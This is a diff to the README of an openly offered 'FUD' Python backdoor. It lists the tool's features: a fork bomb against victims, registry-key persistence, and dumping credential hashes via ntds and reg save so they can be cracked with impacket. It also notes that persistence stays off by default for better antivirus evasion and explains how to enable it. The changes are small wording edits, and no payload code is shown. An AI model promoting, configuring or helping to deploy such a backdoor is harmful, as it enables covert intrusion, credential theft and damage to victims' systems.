@@ -17,7 +17,7 @@ FUD cross-platform python2 persistence backdoor
 7- run a fork bomb on victim machine, just for fun:)  
 8- persistance using REGKEY (windows only)  
 9- client or server connection wait (one time only, no reconnecting yet)  
-10- dump registry hash files (can be manually downloaded and cracked with impacket-secret or impacket-secretsdump )  
+10- dump hashes with ntds and reg save methods ( files should be manually downloaded ) 
 
 # Usage
 `pip install -r requirments.txt`  
@@ -35,10 +35,12 @@ pyinstaller will encrease the detection rate.use this version only:
 
 backdoor doesnt auto-activate the persistence module for better evation chance, if you want to change that simply uncomment
 the self.persistance() line in backdoor file.  
+
 for list of commnads type 'help' in the listener console.   
+
 tkinter most be installed by default, otherwise install it with:  
 `apt install python-tk`  
-the `enum` command results will be saved in the listener directory to see colored output use cat `enum*.txt`  
+the `enum` command results will be saved in the listener directory to see colored output use `cat enum*.txt`  
 
 # PoC  
   using pure python code:  
